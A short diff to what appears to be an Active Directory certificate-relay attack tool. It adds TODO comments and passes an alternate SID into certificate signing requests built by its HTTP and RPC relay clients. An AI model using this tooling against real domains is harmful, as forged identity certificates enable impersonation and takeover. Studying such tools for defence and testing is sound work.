@@ -554,6 +554,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             template = "Machine" if self.username.endswith("$") else "User"
 
         # Generate certificate signing request
+        # TODO: Add support for more parameters as with req.py
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.dns,
@@ -916,10 +917,12 @@ class ADCSRPCAttackClient(ProtocolAttack):
         )
 
         # Generate certificate signing request
+        # TODO: Add support for more parameters as with req.py
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.dns,
             alt_upn=self.adcs_relay.upn,
+            alt_sid=self.adcs_relay.sid,
             key_size=self.adcs_relay.key_size,
         )
         self.key = key
